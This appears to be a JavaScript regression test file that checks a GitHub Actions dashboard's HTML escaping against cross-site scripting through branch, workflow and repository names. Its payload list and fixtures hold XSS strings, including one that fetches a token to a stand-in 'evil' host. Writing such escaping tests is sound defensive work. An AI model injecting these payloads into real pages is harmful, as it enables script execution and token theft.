// Regression tests for the injection bug this rewrite exists to fix.
//
// Branch names, workflow names and repository descriptions are all controlled
// by whoever can push to a repository the token can read. The legacy dashboard
// interpolated them straight into innerHTML, so a branch called
// `<img src=x onerror=…>` ran script on a page holding a PAT.

import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { esc, html, join, raw } from '../src/js/lib/dom.js';
import { normalizeRun } from '../src/js/data/normalize.js';
import { buildIndex } from '../src/js/data/analytics.js';
import { runRow, statusBadge } from '../src/js/ui/components.js';

const PAYLOADS = [
  '<img src=x onerror=alert(1)>',
  '"><script>fetch("//evil/"+token)</script>',
  "' onmouseover='steal()",
  '</td></tr><tr><td>injected',
  '<svg/onload=alert(1)>',
  'javascript:alert(1)',
  '&lt;already-escaped&gt;',
];

describe('html template escaping', () => {
  it('escapes every dangerous character in text position', () => {
    PAYLOADS.forEach((payload) => {
      const out = String(html`<td>${payload}</td>`);
      assert.equal(out.includes('<img'), false, payload);
      assert.equal(out.includes('<script'), false, payload);
      assert.equal(out.includes('<svg'), false, payload);
      assert.equal(out.includes('</td></tr><tr>'), false, payload);
    });
  });

  it('escapes quotes so an attribute cannot be broken out of', () => {
    const out = String(html`<a title="${`" onclick="alert(1)`}">x</a>`);
    assert.equal(out.includes('onclick="alert'), false);
    assert.match(out, /&quot;/);
  });

  it('escapes single quotes too', () => {
    assert.match(String(html`<a data-x='${"' onload='x"}'>y</a>`), /&#39;/);
  });

  it('escapes values nested through arrays and sub-templates', () => {
    const out = String(html`<ul>${PAYLOADS.map((p) => html`<li>${p}</li>`)}</ul>`);
    assert.equal(out.includes('<img'), false);
    assert.equal((out.match(/<li>/g) || []).length, PAYLOADS.length);
  });

  it('renders null, undefined and false as empty rather than as text', () => {
    assert.equal(String(html`[${null}][${undefined}][${false}]`), '[][][]');
    assert.equal(esc(null), '');
  });

  it('passes through only what is explicitly marked trusted', () => {
    assert.equal(String(html`${raw('<b>ok</b>')}`), '<b>ok</b>');
    assert.equal(String(html`${'<b>no</b>'}`), '&lt;b&gt;no&lt;/b&gt;');
  });

  it('joins trusted chunks without re-escaping them', () => {
    assert.equal(String(join([html`<i>a</i>`, html`<i>b</i>`])), '<i>a</i><i>b</i>');
  });
});

describe('rendered components never emit attacker markup', () => {
  const hostile = normalizeRun(
    {
      id: 42,
      name: '<script>alert("wf")</script>',
      status: 'completed',
      conclusion: 'failure',
      created_at: '2026-08-27T10:00:00Z',
      run_started_at: '2026-08-27T10:00:30Z',
      updated_at: '2026-08-27T10:05:30Z',
      head_branch: '"><img src=x onerror=alert(1)>',
      head_sha: 'deadbee',
    },
    'evil/<svg onload=alert(1)>',
  );

  it('escapes the run row', () => {
    const out = String(runRow(hostile));
    assert.equal(out.includes('<script'), false);
    assert.equal(out.includes('<img src=x'), false);
    // The row carries its own trusted <svg> icons, so look for the payload's
    // handler attached to a real tag rather than for the tag name alone.
    assert.equal(/<svg[^>]*onload/.test(out), false);
    assert.equal(/<img[^>]*onerror/.test(out), false);
    assert.match(out, /&lt;script&gt;/);
    assert.match(out, /&lt;svg onload/);
    assert.match(out, /&quot;&gt;&lt;img src=x onerror=alert\(1\)&gt;/, 'the branch payload stays escaped inside its attribute');
  });

  it('escapes the status badge label', () => {
    assert.equal(String(statusBadge('failed')).includes('<script'), false);
  });

  it('keeps hostile names out of data attributes used for event delegation', () => {
    const out = String(runRow(hostile));
    // The delegated handler reads data-run-repo; it must stay one attribute.
    const match = out.match(/data-run-repo="([^"]*)"/);
    assert.ok(match, 'data-run-repo attribute should be present and quoted');
    assert.equal(match[1].includes('<'), false);
  });
});

describe('analytics tolerate hostile and malformed payloads', () => {
  it('builds an index without throwing on missing fields', () => {
    const runs = [
      normalizeRun({}, 'a/b'),
      normalizeRun({ id: 1, status: 'completed', conclusion: 'success' }, 'a/b'),
      normalizeRun({ id: 2, created_at: 'not-a-date', status: 'queued' }, 'a/b'),
    ];
    const index = buildIndex(runs);
    assert.equal(index.runs.length, 3);
    assert.ok(Number.isFinite(index.overall.successRate));
  });
});
